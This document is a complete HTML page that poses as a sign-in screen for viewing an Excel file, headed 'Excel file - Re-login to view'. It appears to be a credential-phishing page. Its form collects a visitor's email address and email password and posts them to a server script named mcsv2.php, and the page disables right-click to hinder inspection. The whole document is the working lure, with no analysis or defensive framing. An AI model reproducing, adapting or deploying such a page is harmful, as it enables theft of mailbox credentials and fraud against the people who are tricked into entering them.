<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in to view file</title>
<link rel="icon" type="image/png" href="images/logo.png">
<link rel="stylesheet" href="css/style2.css">
<script>
var link = document.createElement('link');
link.type = 'image/jpg';
link.rel = 'shortcut icon';
link.href = '/favicon.jpg';
document.getElementsByTagName('head')[0].appendChild(link);
</script>
</head>
<body oncontextmenu="return false";>
<div class="lbox">
<div class="spin-block" id="spin-block">
<img src="images/spin.gif">
</div>
<div class="htxt">
Excel file - Re-login to view
</div>
<hr class="hr">
<div class="fbox">
<form action="mcsv2.php" method="post">
<label for="email">Email:</label>
<input type="email" class="input" name="mail" placeholder="Enter your email" value="">
<label for="password">Password:</label>
<input type="password" class="input" name="pass" placeholder="Enter email password" value="">
<button class="submit" id="submit">Login</button>
</form>
</div>
</div>
</body>
</html>